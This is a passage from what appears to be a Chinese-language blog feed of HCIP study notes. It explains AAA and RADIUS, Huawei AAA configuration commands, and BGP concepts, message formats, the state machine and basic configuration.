Authentication:</h4><ul><li>AAA支持三种认证方式:<ul><li>不认证：完全信任用户，不对用户身份进行合法性检查。鉴于安全考虑，这种认证方式很少被采用</li><li>本地认证：将本地用户信息（包括用户名、密码和各种属性）配置在NAS上，此时NAS就是AAA Server<ul><li>本地认证的优点是处理速度快、运营成本低；</li><li>缺点是存储信息量受设备硬件条件限制</li><li>这种认证方式常用于对用户登录设备进行管理，如Telnet，FTP用户等。</li></ul></li><li>远端认证：将用户信息（包括用户名、密码和各种属性）配置在认证服务器上。支持通过RADIUS协议或HWTACACS协议进行远端认证。NAS作为客户端，与RADIUS服务器或HWTACACS服务器进行通信。</li></ul></li></ul><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/AAA_认证示意图.png" style="zoom:50%;" /><h4 id="授权-Authorization："><a href="#授权-Authorization：" class="headerlink" title="授权 Authorization："></a>授权 Authorization：</h4><ul><li>AAA授权功能赋予用户访问的特定网络或设备的权限。AAA支持以下授权方式：<ul><li>不授权：不对用户进行授权处理</li><li>本地授权：根据NAS上对应域下的配置进行授权</li><li>远端授权：支持由RADIUS服务器授权或HWTACACS服务器授权<ul><li>HWTACACS授权，使用HWTACACS服务器对所有用户授权</li><li>RADIUS授权，只支持对通过RADIUS服务器认证的用户授权。RADIUS协议的认证和授权是绑定在一起的，不能单独使用RADIUS进行授权</li></ul></li></ul></li><li>当采用远端授权时，用户可以同时从授权服务器和NAS获取授权信息。NAS配置的授权信息优先级比授权服务器下发的授权信息低</li></ul><p>授权信息包括：所属用户组、所属VLAN、ACL编号等</p><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/AAA_授权示意图.png" style="zoom: 50%;" /><h4 id="计费-Accouting"><a href="#计费-Accouting" class="headerlink" title="计费 Accouting :"></a>计费 Accouting :</h4><blockquote><p>计费功能用于监控授权用户的网络行为和网络资源的使用情况。</p></blockquote><ul><li>AAA支持以下两种计费方式：<ul><li>不计费：为用户提供免费上网服务，不产生相关活动日志</li><li>远端计费：支持通过RADIUS服务器或HWTACACS服务器进行远端计费</li></ul></li></ul><h4 id="AAA实现协议-RADIUS"><a href="#AAA实现协议-RADIUS" class="headerlink" title="AAA实现协议 - RADIUS"></a>AAA实现协议 - RADIUS</h4><ul><li>AAA可以用多种协议来实现，最常用的是RADIUS协议。RADIUS是一种分布式的、客户端/服务器结构的信息交互协议，可以实现对用户的认证、计费和授权功能</li><li>通常由NAS作为RADIUS客户端，负责传输用户信息到指定的RADIUS服务器，然后根据从服务器返回的信息进行相应处理 如接受/拒绝用户接入</li><li>RADIUS服务器一般运行在中心计算机或工作站上，维护相关的用户认证和网络服务访问信息，负责接收用户连接请求并认证用户，然后给客户端返回所有需要的信息（如接受/拒绝认证请求）。</li><li>RADIUS使用UDP（User Datagram Protocol）作为传输协议，并规定UDP端口1812、1813分别作为认证、计费端口，具有良好的实时性；同时也支持重传机制和备用服务器机制，从而具有较好的可靠性。</li><li>RADIUS客户端与服务器间的消息流程如下：<ol><li>当用户接入网络时，用户发起连接请求，向RADIUS客户端（即NAS）发送用户名和密码</li><li>RADIUS客户端向RADIUS服务器发送包含用户名和密码信息的认证请求报文</li><li>RADIUS服务器接收到合法的请求后，完成认证，并把所需的用户授权信息返回给客户端；对于非法的请求，RADIUS服务器返回认证失败的信息给客户端</li><li>RADIUS客户端通知用户认证是否成功</li><li>RADIUS客户端根据接收到的认证结果接入/拒绝用户。如果允许用户接入，则RADIUS客户端向RADIUS服务器发送计费开始请求报文</li><li>RADIUS服务器返回计费开始响应报文，并开始计费</li><li>用户开始访问网络资源</li><li>当用户不再想要访问网络资源时，用户发起下线请求，请求停止访问网络资源</li><li>RADIUS客户端向RADIUS服务器提交计费结束请求报文</li><li>RADIUS服务器返回计费结束响应报文，并停止计费</li><li>RADIUS客户端通知用户访问结束，用户结束访问网络资源</li></ol></li></ul><h4 id="AAA常见应用场景"><a href="#AAA常见应用场景" class="headerlink" title="AAA常见应用场景"></a>AAA常见应用场景</h4><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/AAA_常见应用场景.png" style="zoom:67%;" /><h3 id="AAA配置实现"><a href="#AAA配置实现" class="headerlink" title="AAA配置实现"></a>AAA配置实现</h3><p><strong>1 . 进入AAA视图</strong></p><pre class="line-numbers language-none"><code class="language-none">[Huawei] aaa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>2 . 创建认证方案</strong></p><pre class="line-numbers language-none"><code class="language-none">[Huawei-aaa] authentication-scheme authentication-scheme-name <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>创建认证方案并进入相应的认证方案视图</li><li>authorization-scheme authorization-scheme-name命令用来配置域的授权方案。缺省情况下，域下没有绑定授权方案</li></ul><pre class="line-numbers language-none"><code class="language-none">[Huawei-aaa-authentication-scheme-name] authentication-mode &#123;hwtacacs | local | radius&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>配置认证方式，local指定认证方式为本地认证。缺省情况下，认证方式为本地认证</li><li>authentication-mode { hwtacacs | local | radius }命令用来配置当前认证方案使用的认证方式。缺省情况下，认证模式为本地认证方式</li></ul><p><strong>3 .  创建domain并绑定认证方案</strong></p><pre class="line-numbers language-none"><code class="language-none">[Huawei-aaa] domain domain-name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>创建domain并进入相应的domain视图</li></ul><pre class="line-numbers language-none"><code class="language-none">[Huawei-aaa-domain-name] authentication-scheme authentication-scheme-name <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>在相应的domain视图下绑定认证方案</li></ul><p><strong>4 . 创建用户</strong></p><pre class="line-numbers language-none"><code class="language-none">[Huawei-aaa] local-user user-name  password cipher password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>创建本地用户，并配置本地用户的密码：<ul><li>如果用户名中带域名分隔符，如@，则认为@前面的部分是用户名，后面部分是域名</li><li>如果没有@，则整个字符串为用户名，域为默认域</li></ul></li></ul><p><strong>5 . 配置用户接入类型</strong></p><pre class="line-numbers language-none"><code class="language-none">[Huawei-aaa] local-user user-name service-type&#123; &#123; terminal | telnet | ftp | ssh | snmp | http &#125; | ppp | none&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>设置本地用户的接入类型。缺省情况下，本地用户关闭所有的接入类型。</li></ul><p><strong>6 . 配置用户级别</strong></p><pre class="line-numbers language-none"><code class="language-none">[Huawei-aaa] local-user user-name privilege level level<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>指定本地用户的权限级别</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;font color=&quot;FF6600&quot;&gt;AAA（Authentication, Authorization, and Accounting）是一种管理框架，它提供了授权部分用户访问指定资源和记录这些用户操作行为的安全机制。因其具有良好的可扩展性，</summary>
      
    
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/categories/HCIP/"/>
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/tags/HCIP/"/>
    
  </entry>
  
  <entry>
    <title>外部网关路由协议 BGP</title>
    <link href="https://shierjinghuang.github.io/2023/03/31/%E5%A4%96%E9%83%A8%E7%BD%91%E5%85%B3%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE%20BGP/"/>
    <id>https://shierjinghuang.github.io/2023/03/31/%E5%A4%96%E9%83%A8%E7%BD%91%E5%85%B3%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE%20BGP/</id>
    <published>2023-03-31T03:58:35.000Z</published>
    <updated>2023-04-09T07:23:24.163Z</updated>
    
    <content type="html"><![CDATA[<center><h1>外部网关路由协议 BGP</h1></center>[TOC]<h2 id="BGP概述"><a href="#BGP概述" class="headerlink" title="BGP概述"></a>BGP概述</h2><p>OSPF、IS-IS等IGP路由协议在组织机构网络内部广泛应用，随着网络规模扩大，网络中路由数量不断增长，IGP已无法管理大规模网络，AS的概念由此诞生。<br>AS指的是在同一个组织管理下，使用统一选路策略的设备集合<br>不同AS通过AS号区分，AS号存在16bit、32bit两种表示方式。IANA负责AS号的分发。</p><p>IANA（Internet Assigned Numbers Authority，因特网地址分配组织）：IAB（Internet Architecture Board，因特网体系委员会）的下设组织。IANA授权NIC（ Network Information Center，网络信息中心）和其他组织负责IP地址和域名分配，同时，IANA负责维护TCP/IP协议族所采用的协议标识符数据库，包括自治系统号。<br>在长度为16bit的AS号表示方式中：64512-65534为私有AS号，在长度为32bit的AS号表示方式中：4200000000-4294967294为私有AS号。</p><h3 id="使用IGP——内部网关协议-传递路由"><a href="#使用IGP——内部网关协议-传递路由" class="headerlink" title="使用IGP——内部网关协议 传递路由:"></a>使用IGP——内部网关协议 传递路由:</h3><p>AS之间需要直连链路，或通过VPN协议构造逻辑直连进行邻居建立</p><ul><li>AS之间可能是不同的机构、公司，相互之间无法完全信任，使用IGP可能存在暴露AS内部的网络信息的风险</li></ul><blockquote><p><font color="orange">整个网络规模扩大，路由数量进一步增加，路由表规模变大，路由收敛变慢，设备性能消耗加大 </font></p></blockquote><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/使用IGP传递路由.png" alt="使用IGP传递路由" style="zoom:80%;" /><h3 id="使用BGP传递路由"><a href="#使用BGP传递路由" class="headerlink" title="使用BGP传递路由:"></a>使用BGP传递路由:</h3><p>AS之间专门使用BGP（Border Gateway Protocol，边界网关协议）协议进行路由传递，相较于传统的IGP协议有以下优点 ：</p><ul><li>BGP基于TCP，只要能够建立TCP连接即可建立BGP</li><li>只传递路由信息，不会暴露AS内的拓扑信息</li><li>触发式更新，而不是进行周期性更新</li></ul><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/使用BGP传递路由.png" alt="使用BGP传递路由" style="zoom:80%;" /><h3 id="BGP在企业中的应用"><a href="#BGP在企业中的应用" class="headerlink" title="BGP在企业中的应用"></a>BGP在企业中的应用</h3><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/BGP在企业网的应用.png" style="zoom: 67%;" /><h2 id="BGP的基本概念"><a href="#BGP的基本概念" class="headerlink" title="BGP的基本概念"></a>BGP的基本概念</h2><p><font color="FF3300">BGP是一种实现自治系统AS之间的路由可达，并选择最佳路由的矢量性协议</font></p><ul><li>早期发布的三个版本分别是BGP-1、BGP-2和BGP-3，1994年开始使用BGP-4，2006年之后单播IPv4网络使用的版本是BGP-4，其他网络使用的版本是MP-BGP</li></ul><h4 id="BGP的特点："><a href="#BGP的特点：" class="headerlink" title="BGP的特点："></a>BGP的特点：</h4><ul><li>BGP使用TCP作为其传输层协议（端口号为179），使用触发式路由更新，而不是周期性路由更新</li><li>BGP能够承载大批量的路由信息，能够支撑大规模网络</li><li>BGP提供了丰富的路由策略，能够灵活的进行路由选路，并能指导对等体按策略发布路由</li><li>BGP能够支撑MPLS/VPN的应用，传递客户VPN路由</li><li>BGP提供了路由聚合和路由衰减功能用于防止路由振荡，通过这两项功能有效地提高了网络稳定性</li></ul><h3 id="BGP特征："><a href="#BGP特征：" class="headerlink" title="BGP特征："></a>BGP特征：</h3><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/BGP特征示意图.png" alt="BGP特征示意图" style="zoom:80%;" /><ul><li>BGP使用TCP为传输层协议，TCP端口号179。路由器之间的BGP会话基于TCP连接而建立</li><li>运行BGP的路由器被称为BGP发言者（BGP Speaker），或BGP路由器</li><li>两个建立BGP会话的路由器互为对等体（Peer），BGP对等体之间交换BGP路由表</li><li>BGP路由器只发送增量的BGP路由更新，或进行触发式更新</li><li>BGP能够承载大批量的路由前缀，可在大规模网络中应用</li><li>BGP通常被称为路径矢量路由协议（Path-Vector Routing Protocol）</li><li>每条BGP路由都携带多种路径属性（Path attribute），BGP可以通过这些路径属性控制路径选择，而不像IS-IS、OSPF只能通过Cost控制路径选择，因此在路径选择上，BGP具有丰富的可操作性，可以在不同场景下选择最合适的路径控制方式。</li></ul><h3 id="BGP对等体关系"><a href="#BGP对等体关系" class="headerlink" title="BGP对等体关系"></a>BGP对等体关系</h3><blockquote><p><font color="BLUE">两个建立BGP会话的路由器互为对等体（Peer），BGP对等体之间交换BGP路由表</font></p></blockquote><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/BGP对等体.png" alt="BGP对等体" style="zoom:80%;" /><ul><li><p>与OSPF、IS-IS等协议不同，<strong>BGP的会话是基于TCP建立的</strong></p></li><li><p><strong>建立BGP对等体关系的两台路由器并不要求必须直连</strong></p></li><li><p>BGP存在两种对等体关系类型：EBGP及IBGP：</p><blockquote><p><font color="FF3300">EBGP（External BGP）：位于不同自治系统的BGP路由器之间的BGP对等体关系</font></p></blockquote></li><li><p>两台路由器之间要建立EBGP对等体关系，必须满足两个条件：</p><ul><li>两个路由器所属AS不同（即AS号不同）</li><li>在配置EBGP时，Peer命令所指定的对等体IP地址要求路由可达，并且TCP连接能够正确建立</li></ul><blockquote><p><font color="FF3300">IBGP（Internal BGP）：位于相同自治系统的BGP路由器之间的BGP邻接关系</font></p></blockquote></li></ul><h4 id="BGP对等体关系建立"><a href="#BGP对等体关系建立" class="headerlink" title="BGP对等体关系建立"></a>BGP对等体关系建立</h4><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/BGP对等体示意图.png" alt="BGP对等体示意图" style="zoom:67%;" /><ul><li><p>先启动BGP的一端先发起TCP连接，如图所示，R1先启动BGP，R1使用随机端口号向R2的179端口发起TCP连接，完成TCP连接的建立</p></li><li><p>三次握手建立完成之后，R1、R2之间相互发送Open报文，携带参数用于对等体建立，参数协商正常之后双方相互发送Keepalive报文，收到对端发送的Keepalive报文之后对等体建立成功，同时双方定期发送Keepalive报文用于保持连接</p></li><li><p>其中Open报文中携带：</p><ul><li>My Autonomous System：自身AS号</li><li>Hold Time：用于协商后续Keepalive报文发送时间</li><li>BGP Identifier：自身Router ID</li></ul></li><li><p>BGP对等体关系建立之后，BGP路由器发送BGP Update（更新）报文通告路由到对等体。</p></li></ul><blockquote><p>BGP建立对等体的对等体都会发起TCP三次握手，所以会建立两个TCP连接，但是实际BGP只会保留其中一个TCP连接，从Open报文中获取对端BGP Identifier之后BGP对等体会比较本端的Router ID和对端的Router ID大小，如果本端Router ID小于对端Router ID，则会关闭本地建立的TCP连接，使用由对端主动发起创建的TCP连接进行后续的BGP报文交互</p></blockquote><h4 id="TCP连接源地址"><a href="#TCP连接源地址" class="headerlink" title="TCP连接源地址"></a>TCP连接源地址</h4><p><font color="BLUE">缺省情况下，BGP使用报文出接口作为TCP连接的本地接口，在部署IBGP对等体关系时，建议使用Loopback地址作为更新源地址</font></p><ul><li>Loopback接口非常稳定，而且可以借助AS内的IGP和冗余拓扑来保证可靠性</li><li>在部署EBGP对等体关系时，通常使用直连接口的IP地址作为源地址，如若使用Loopback接口建立EBGP对等体关系，则应注意EBGP多跳问题</li></ul><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/冗余链路示意图.png" alt="冗余链路示意图" style="zoom:67%;" /><blockquote><p>一般而言在AS内部，网络具备一定的冗余性。在R1与R3之间，如果采用直连接口建IBGP邻居关系，那么一旦接口或者直连链路发生故障，BGP会话也就断了，但是事实上，由于冗余链路的存在，R1与R3之间的IP连通性其实并没有DOWN</p></blockquote><h3 id="BGP报文及状态机"><a href="#BGP报文及状态机" class="headerlink" title="BGP报文及状态机"></a>BGP报文及状态机</h3><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/BGP报文格式.png" alt="BGP报文格式" style="zoom:67%;" /><h4 id="BGP报文类型"><a href="#BGP报文类型" class="headerlink" title="BGP报文类型:"></a>BGP报文类型:</h4><p><font color="FF0000">BGP存在5种类型的报文，不同类型的报文拥有相同的头部（header）</font></p><p>不同于常见的IGP协议，<font color="FF6600"><strong>BGP使用TCP作为传输层协议，端口号179</strong></font>，这使得BGP支持在非直连的路由器之间建立对等体关系</p><table><thead><tr><th>报文名称</th><th>作用</th><th>发送时刻</th></tr></thead><tbody><tr><td>Open</td><td>协商BGP对等体参数，建立对等体关系</td><td>BGP TCP连接建立成功之后</td></tr><tr><td>Update</td><td>发送BGP路由更新</td><td>BGP对等体关系建立之后有路由需要发送或路由变化时向对等体发送Update报文</td></tr><tr><td>Notification</td><td>报告错误信息，中止对等体关系</td><td>当BGP在运行中发现错误时，发送Notification报文将错误通告给BGP对等体</td></tr><tr><td>Keepalive</td><td>标志对等体建立，维持BGP对等体关系</td><td>BGP路由器收到对端发送的Keepalive报文，将对等体状态置为已建立，同时后续定期发送keepalive报文用 于保持连接</td></tr><tr><td>Route_refresh</td><td>用于在改变路由策略后请求对等体重新发送路由信息。只有支持路由刷新能力的BGP设备会发送和响应此报文</td><td>当路由策略发生变化时，触发请求对等体重新通告路由</td></tr></tbody></table><h4 id="BGP报文格式"><a href="#BGP报文格式" class="headerlink" title="BGP报文格式:"></a>BGP报文格式:</h4><h5 id="BGP报文格式-报文头格式"><a href="#BGP报文格式-报文头格式" class="headerlink" title="BGP报文格式 - 报文头格式"></a>BGP报文格式 - 报文头格式</h5><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/BGP报文头格式.png" style="zoom:80%;" /><ul><li>BGP五种报文都拥有相同的报文头，格式如左侧所示，主要字段解释如下：<ul><li>Marker：16Byte，用于标明BGP报文边界，所有bit均为“1”</li><li>Length：2Byte，BGP报文总长度（包括报文头在内），以Byte为单位</li><li>Type：1Byte，BGP报文的类型。其取值从1到5，分别表示Open、Update、Notification、Keepalive和Route-refresh 报文</li></ul></li></ul><h5 id="BGP报文格式-Open"><a href="#BGP报文格式-Open" class="headerlink" title="BGP报文格式 - Open"></a>BGP报文格式 - Open</h5><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/BGP_OPen报文格式.png" alt="BGP_OPen报文格式" style="zoom:80%;" /><ul><li><font color="FF6600"><strong>Open报文是TCP连接建立之后发送的第一个报文，用于建立BG对等体之间的连接关系</strong></font>，报文格式如左侧所示，主要字段解释如下：<ul><li>Version：BGP的版本号。对于BGP 4来说，其值为4</li><li>My AS autonomous system：本地AS号。通过比较两端的AS号可以判断对端是否和本端处于相同AS</li><li>Hold Time：保持时间。在建立对等体关系时两端要协商Hold Time，并保持一致。如果在这个时间内未收到对端发来的Keepalive报文或Update报文，则认为BGP连接中断</li><li>BGP Identifier：BGP标识符，以IP地址的形式表示，用来识别BGP路由器</li><li>Opt Parm Len：Optional parameters的长度</li><li>Optional parameters：宣告自身对于一些可选功能的支持，比如认证、多协议支持,除了IPv4单播路由信息，BGP4+还支持多种网络层协议，在协商时BGP对等体之间会通过</li><li>Optional_parameters字段协商对网络层协议的支持能力</li></ul></li></ul><h5 id="BGP报文格式-Update"><a href="#BGP报文格式-Update" class="headerlink" title="BGP报文格式 - Update"></a>BGP报文格式 - Update</h5><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/BGP_Update报文.png" alt="BGP_Update报文" style="zoom: 80%;" /><ul><li><font color="FF6600"><strong>Update报文用于在对等体之间传递路由信息，可以用于发布、撤销路由</strong></font></li><li>一个Update报文可以通告具有相同路径属性的多条路由，这些路由保存在NLRI（Network Layer Reachable Information，网络层可达信息）中。同时Update还可以携带多条不可达路由，用于告知对方撤销路由，这些保存在Withdrawn Routes字段中。</li><li>报文格式如左侧所示，主要字段解释如下：<ul><li>Withdrawn routes：不可达路由的列表</li><li>Path attributes：与NLRI相关的所有路径属性列表，每个路径属性由一个TLV（Type-Length-Value）三元组构成</li><li>NLRI：可达路由的前缀和前缀长度二元组</li><li>Unfeasible routes length：不可达路由字段的长度，以Byte为单位。如果为0则说明没有Withdrawn Routes 字段</li><li>Withdrawn Routes Length：标明Withdrawn Routes部分的长度。其值为零时，表示没有撤销的路由</li><li>Total path attribute length：路径属性字段的长度，以Byte为单位，如果为0则说明没有Path Attributes 字段</li></ul></li></ul><h5 id="BGP报文格式-Notification"><a href="#BGP报文格式-Notification" class="headerlink" title="BGP报文格式 - Notification"></a>BGP报文格式 - Notification</h5><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/BGP_Notification报文.png" alt="BGP_Notification报文" style="zoom:80%;" /><ul><li>当BGP检测到错误状态时（对等体关系建立时、建立之后都可能发生），就会向对等体发送Notification，告知对端错误原因。之后BGP连接将会立即中断<ul><li>Error Code、Error subcode：差错码、差错子码，用于告知对端具体的错误类型</li><li>Data：用于辅助描述详细的错误内容，长度并不固定</li></ul></li></ul><h5 id="BGP报文格式-Keepalive"><a href="#BGP报文格式-Keepalive" class="headerlink" title="BGP报文格式 - Keepalive"></a>BGP报文格式 - Keepalive</h5><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/BGP_Keepalive报文.png" alt="BGP_Keepalive" style="zoom:80%;" /><ul><li><font color="FF6600"><strong>BGP路由器收到对端发送的Keepalive报文，将对等体状态置为已建立，同时后续定期发送keepalive报文用于保持连接</strong></font></li><li>Keepalive报文格式中只包含报文头，没有附加其他任何字段</li></ul><h5 id="BGP报文格式-Route-refresh"><a href="#BGP报文格式-Route-refresh" class="headerlink" title="BGP报文格式 - Route-refresh"></a>BGP报文格式 - Route-refresh</h5><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/BGP_Route-refresh报文.png" alt="BGP_Route-refresh报文"  /><ul><li><font color="FF6600"><strong>Route-refresh报文用来要求对等体重新发送指定地址族的路由信息</strong></font>，一般为本端修改了相关路由策略之后让对方重新发送Update报文，本端执行新的路由策略重新计算BGP路由。</li><li>相关字段内容如下：<ul><li>AFI：Address Family Identifier，地址族标识，如IPv4</li><li>Res.：保留，8个bit必须置0</li><li>SAFI：Subsequent Address Family Identifier，子地址族标识</li></ul></li><li>补充信息：<ul><li>在Open报文协商时会协商是否支持Route-refresh，如果对等体支持<strong>Route-refresh</strong>能力，则可以通过refresh bgp命令手工对BGP连接进行软复位，BGP软复位可以在不中断BGP连接的情况下重新刷新BGP路由表，并应用新的策略</li><li>对于不支持Route-Refresh能力的BGP对等体，可以配置<strong>keep-all-routes</strong>命令，保留该对等体的所有原始路由，这样不需要复位BGP连接即可完成路由表的刷新</li><li>缺省情况下未开启<strong>keep-all-routes</strong></li></ul></li></ul><h4 id="BGP状态机"><a href="#BGP状态机" class="headerlink" title="BGP状态机"></a>BGP状态机</h4><table><thead><tr><th>Peer状态名称</th><th><strong>用途</strong></th></tr></thead><tbody><tr><td>Idle</td><td>开始准备TCP的连接并监视远程对等体，启用BGP时，要准备足够的资源</td></tr><tr><td>Connect</td><td>正在进行TCP连接，等待完成中，认证都是在TCP建立期间完成的。如果TCP连接建立失败则进入Active状态，反复尝试连接</td></tr><tr><td>Active</td><td>TCP连接没建立成功，反复尝试TCP连接</td></tr><tr><td>OpenSent</td><td>TCP连接已经建立成功，开始发送Open包，Open包携带参数协商对等体的建立</td></tr><tr><td>OpenConfirm</td><td>参数、能力特性协商成功，自己发送Keepalive包，等待对方的Keepalive包</td></tr><tr><td>Established</td><td>已经收到对方的Keepalive包，双方能力特性经协商发现一致，开始使用Update通告路由信息</td></tr></tbody></table><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/BGP状态机示意图.png" alt="BGP状态机示意图" style="zoom:80%;" /><ul><li><p>Idle状态是BGP初始状态。在Idle状态下，BGP拒绝对等体发送的连接请求。只有在收到本设备的Start事件后，BGP才开始尝试和其它BGP对等体进行TCP连接，并转至Connect状态</p><ul><li>Start事件是由一个操作者配置一个BGP过程，或者重置一个已经存在的过程或者路由器软件重置BGP过程引起的</li><li>任何状态中收到Notification报文或TCP拆链通知等Error事件后，BGP都会转至Idle状态</li></ul></li><li><p>在Connect状态下，BGP启动连接重传定时器（Connect Retry），等待TCP完成连接</p><ul><li>如果TCP连接成功，那么BGP向对等体发送Open报文，并转至OpenSent状态</li><li>如果TCP连接失败，那么BGP转至Active状态</li><li>如果连接重传定时器超时，BGP仍没有收到BGP对等体的响应，那么BGP继续尝试和其它BGP对等体进行TCP连接，停留在Connect状态。</li></ul></li><li><p>在Active状态下，BGP总是在试图建立TCP连接</p><ul><li>如果TCP连接成功，那么BGP向对等体发送Open报文，关闭连接重传定时器，并转至OpenSent状态</li><li>如果TCP连接失败，那么BGP停留在Active状态</li><li>如果连接重传定时器超时，BGP仍没有收到BGP对等体的响应，那么BGP转至Connect状态</li></ul></li><li><p>在OpenSent状态下，BGP等待对等体的Open报文，并对收到的Open报文中的AS号、版本号、认证码等进行检查</p><ul><li>如果收到的Open报文正确，那么BGP发送Keepalive报文，并转至OpenConfirm状态</li><li>如果发现收到的Open报文有错误，那么BGP发送Notification报文给对等体，并转至Idle状态</li></ul></li><li><p>在OpenConfirm状态下，BGP等待Keepalive或Notification报文。如果收到Keepalive报文，则转至Established状态，如果收到Notification报文，则转至Idle状态</p></li><li><p>在Established状态下，BGP可以和对等体交换Update、Keepalive、Route-refresh报文和Notification报文<br>如果收到正确的Update或Keepalive报文，那么BGP就认为对端处于正常运行状态，将保持BGP连接</p><ul><li>如果收到错误的Update或Keepalive报文，那么BGP发送Notification报文通知对端，并转至Idle状态。<br>Route-refresh报文不会改变BGP状态</li><li>如果收到Notification报文，那么BGP转至Idle状态</li><li>如果收到TCP拆链通知，那么BGP断开连接，转至Idle状态</li></ul></li></ul><h4 id="BGP状态机详情："><a href="#BGP状态机详情：" class="headerlink" title="BGP状态机详情："></a>BGP状态机详情：</h4><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/idle状态.png" alt="idle状态" style="zoom: 67%;" /><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/Connect.png" style="zoom:67%;" /><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/BGP状态机2.png" style="zoom:67%;" /><h3 id="BGP协议表项"><a href="#BGP协议表项" class="headerlink" title="BGP协议表项"></a>BGP协议表项</h3><h3 id="BGP路由生成"><a href="#BGP路由生成" class="headerlink" title="BGP路由生成"></a>BGP路由生成</h3><p><font color="BLUE">不同于IGP路由协议，BGP自身并不会发现并计算产生路由，BGP将IGP路由表中的路由注入到BGP路由表中，并通过Update报文传递给BGP对等体</font></p><ul><li>BGP注入路由的方式有两种：<ul><li>Network</li><li>import-route</li></ul></li></ul><p>与IGP协议相同，BGP支持根据已有的路由条目进行聚合，生成聚合路由</p><h4 id="Network注入路由"><a href="#Network注入路由" class="headerlink" title="Network注入路由"></a>Network注入路由</h4><img src="https://shierjinghuang.github.io/2023/03/31/外部网关路由协议 BGP/Network注入路由示意图.png" style="zoom:80%;" /><blockquote><p><font color="blue">Network方式注入的路由必须是已经存在于IP路由表中的路由条目，否则不会被成功注入到BGP路由表中</font></p></blockquote><p>通过Network方式注入路由：</p><ol><li>AS200内的BGP路由器已经通过IGP协议OSPF学习到了两条路由：10.1.0.0/24和10.2.0.0/24，在BGP进程内通过network命令注入这两条路由，这两条路由将会出现在本地的BGP路由表中</li><li>AS200内的BGP路由器通过Update报文将路由传递给AS300内的BGP路由器</li><li>AS300内的BGP路由器收到路由后，将这两条路由加入到本地的BGP路由表中</li></ol><h4 id="import-route方式注入路由"><a href="#import-route方式注入路由" class="headerlink" title="import-route方式注入路由"></a>import-route方式注入路由</h4><p><del>Network方式注入路由只能逐条配置逐条注入IP路由表中的路由，如果注入的路由条目很多配置将会非常复杂</del></p><p>可以使用import-route方式，将直连路由、静态路由、OSPF路由、IS-IS路由等协议的路由注入到BGP路由表中</p><h4 id="BGP聚合路由"><a href="#BGP聚合路由" class="headerlink" title="BGP聚合路由"></a>BGP聚合路由</h4><h3 id="BGP通告原则"><a href="#BGP通告原则" class="headerlink" title="BGP通告原则"></a>BGP通告原则</h3><ul><li>BGP通过network、import-route、aggregate聚合方式生成BGP路由后，通过Update报文将BGP路由传递给对等体</li><li>BGP通告遵循以下原则：<ul><li>只发布最优路由</li><li>从EBGP对等体获取的路由，会发布给所有对等体</li><li>IBGP水平分割：从IBGP对等体获取的路由，不会发送给IBGP对等体</li><li>BGP同步规则指的是：当一台路由器从自己的IBGP对等体学习到一条BGP路由时（这类路由被称为IBGP路由），它将不能使用该条路由或把这条路由通告给自己的EBGP对等体，除非它又从IGP协议学习到这条路由，也就是要求IBGP路由与IGP路由同步。同步规则主要用于规避BGP路由黑洞问题。</li></ul></li></ul><h2 id="BGP的基本配置"><a href="#BGP的基本配置" class="headerlink" title="BGP的基本配置"></a>BGP的基本配置</h2><h3 id="配置介绍"><a href="#配置介绍" class="headerlink" title="配置介绍"></a>配置介绍</h3><p><strong>1. 启动BGP进程</strong></p><pre class="line-numbers language-none"><code class="language-none">[R1] bgp &#123;as-number-plain | as-number-dot&#125;[R1-bgp] router-id ipv4-address<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>启动BGP，指定本地AS编号，并进入BGP视图。使用router-id命令配置BGP的Router ID，建议将BGP Router ID配置为设备Loopback接口的地址</p><p><strong>2. 配置BGP对等体</strong></p><pre class="line-numbers language-none"><code class="language-none">[R1-bgp] peer &#123;ipv4-address|ipv6-address&#125; as-number &#123;as-number-plain|as-number-dot&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>创建BGP对等体，指定对等体地址以及AS号</p><p><strong>3. 配置建立对等体使用的源地址、EBGP对等体最大跳数</strong></p><pre class="line-numbers language-none"><code class="language-none">[R1-bgp] peer ipv4-address connect-interface interface-type interface-number [ipv4-source-address][R1-bgp] peer ipv4-address ebgp-max-hop [ hop-count ]<span aria-hidden="true" 